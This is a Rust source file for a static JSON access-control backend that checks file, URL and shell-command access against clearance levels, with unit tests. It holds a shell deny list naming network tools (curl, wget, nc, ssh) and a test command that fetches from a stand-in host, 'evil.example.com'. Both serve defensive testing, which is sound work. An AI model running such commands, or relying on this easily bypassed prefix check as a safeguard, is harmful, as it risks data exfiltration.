//! Static JSON ACL backend.
//!
//! Reads a single JSON file at startup describing the ACL policy. Used for
//! tests, offline development, and as the fallback inside the demo container
//! before NES is wired up.
//!
//! ```json
//! {
//!   "file_rules": [
//!     { "prefix": "/workspace/unofficial/", "min_clearance": "unofficial" },
//!     { "prefix": "/workspace/protected/",  "min_clearance": "protected" }
//!   ],
//!   "url_rules": [
//!     { "host": "intranet.example.gov.au", "min_clearance": "official" }
//!   ],
//!   "shell_deny_prefixes": ["curl ", "wget ", "nc ", "ssh "]
//! }
//! ```

use std::collections::HashMap;
use std::path::Path;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};

use crate::{
    AclDecision, AclEnforcer, AclError, Clearance, Operation, ResourceKind,
    ResourceRef, SimonPrincipal,
};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileRule {
    pub prefix: String,
    pub min_clearance: Clearance,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UrlRule {
    pub host: String,
    pub min_clearance: Clearance,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct StaticPolicy {
    #[serde(default)]
    pub file_rules: Vec<FileRule>,
    #[serde(default)]
    pub url_rules: Vec<UrlRule>,
    /// Shell commands starting with any of these tokens are denied outright.
    #[serde(default)]
    pub shell_deny_prefixes: Vec<String>,
    /// If a file has no matching rule, what's the default?
    #[serde(default)]
    pub default_file_min_clearance: Option<Clearance>,
}

pub struct StaticJsonEnforcer {
    policy: StaticPolicy,
    /// Per-document overrides keyed by canonical absolute path. Populated from
    /// sidecar `.acl.json` files loaded at session start.
    overrides: HashMap<String, Clearance>,
}

impl StaticJsonEnforcer {
    pub fn new(policy: StaticPolicy) -> Self {
        Self {
            policy,
            overrides: HashMap::new(),
        }
    }

    pub fn from_file(path: impl AsRef<Path>) -> Result<Self, AclError> {
        let bytes = std::fs::read(path.as_ref()).map_err(|e| {
            AclError::Backend(format!("reading policy file: {e}"))
        })?;
        let policy: StaticPolicy = serde_json::from_slice(&bytes).map_err(|e| {
            AclError::Backend(format!("parsing policy file: {e}"))
        })?;
        Ok(Self::new(policy))
    }

    pub fn with_overrides(mut self, overrides: HashMap<String, Clearance>) -> Self {
        self.overrides = overrides;
        self
    }

    fn required_for_file(&self, uri: &str) -> Clearance {
        if let Some(c) = self.overrides.get(uri) {
            return *c;
        }
        let mut best: Option<Clearance> = None;
        for rule in &self.policy.file_rules {
            if uri.starts_with(&rule.prefix)
                && best.map(|b| rule.min_clearance > b).unwrap_or(true)
            {
                best = Some(rule.min_clearance);
            }
        }
        best.or(self.policy.default_file_min_clearance)
            .unwrap_or(Clearance::Unofficial)
    }

    fn required_for_url(&self, uri: &str) -> Option<Clearance> {
        let parsed = url::Url::parse(uri).ok()?;
        let host = parsed.host_str()?;
        self.policy
            .url_rules
            .iter()
            .filter(|r| r.host == host)
            .map(|r| r.min_clearance)
            .max()
    }
}

#[async_trait]
impl AclEnforcer for StaticJsonEnforcer {
    async fn check(
        &self,
        principal: &SimonPrincipal,
        resource: &ResourceRef,
        op: Operation,
    ) -> Result<AclDecision, AclError> {
        match resource.kind {
            ResourceKind::File | ResourceKind::Directory => {
                let required = self.required_for_file(&resource.uri);
                if principal.clearance.dominates(required) {
                    Ok(AclDecision::Allow)
                } else {
                    Ok(AclDecision::deny_required(
                        format!(
                            "{} requires {} clearance; you have {}",
                            resource.uri, required, principal.clearance
                        ),
                        required,
                    ))
                }
            }
            ResourceKind::Url => {
                if let Some(required) = self.required_for_url(&resource.uri) {
                    if !principal.clearance.dominates(required) {
                        return Ok(AclDecision::deny_required(
                            format!(
                                "{} requires {} clearance",
                                resource.uri, required
                            ),
                            required,
                        ));
                    }
                }
                Ok(AclDecision::Allow)
            }
            ResourceKind::ShellCommand => {
                // Deny regardless of clearance if it starts with a forbidden
                // prefix. Writes are also denied unconditionally in the demo —
                // there is no write-back story for ACL'd data yet.
                for prefix in &self.policy.shell_deny_prefixes {
                    if resource.uri.trim_start().starts_with(prefix) {
                        return Ok(AclDecision::deny(format!(
                            "shell command starts with forbidden prefix `{}`",
                            prefix.trim_end()
                        )));
                    }
                }
                let _ = op;
                Ok(AclDecision::Allow)
            }
        }
    }

    fn backend_name(&self) -> &'static str {
        "static-json"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Duration;

    fn test_principal(clearance: Clearance) -> SimonPrincipal {
        let now = chrono::Utc::now();
        SimonPrincipal {
            subject: "u1".into(),
            display_name: "Test".into(),
            email: "t@example.gov.au".into(),
            clearance,
            groups: vec![],
            session_id: "s1".into(),
            issued_at: now,
            expires_at: now + Duration::hours(1),
        }
    }

    #[tokio::test]
    async fn official_cannot_read_protected_file() {
        let policy = StaticPolicy {
            file_rules: vec![FileRule {
                prefix: "/workspace/protected/".into(),
                min_clearance: Clearance::Protected,
            }],
            ..Default::default()
        };
        let enforcer = StaticJsonEnforcer::new(policy);
        let resource = ResourceRef::file("/workspace/protected/cabinet-memo.md");
        let decision = enforcer
            .check(&test_principal(Clearance::Official), &resource, Operation::Read)
            .await
            .unwrap();
        assert!(matches!(decision, AclDecision::Deny { .. }));
    }

    #[tokio::test]
    async fn protected_can_read_protected_file() {
        let policy = StaticPolicy {
            file_rules: vec![FileRule {
                prefix: "/workspace/protected/".into(),
                min_clearance: Clearance::Protected,
            }],
            ..Default::default()
        };
        let enforcer = StaticJsonEnforcer::new(policy);
        let resource = ResourceRef::file("/workspace/protected/cabinet-memo.md");
        let decision = enforcer
            .check(&test_principal(Clearance::Protected), &resource, Operation::Read)
            .await
            .unwrap();
        assert!(decision.is_allow());
    }

    #[tokio::test]
    async fn shell_curl_denied() {
        let policy = StaticPolicy {
            shell_deny_prefixes: vec!["curl ".into()],
            ..Default::default()
        };
        let enforcer = StaticJsonEnforcer::new(policy);
        let resource = ResourceRef::shell("curl http://evil.example.com/x");
        let decision = enforcer
            .check(&test_principal(Clearance::Protected), &resource, Operation::Execute)
            .await
            .unwrap();
        assert!(matches!(decision, AclDecision::Deny { .. }));
    }
}
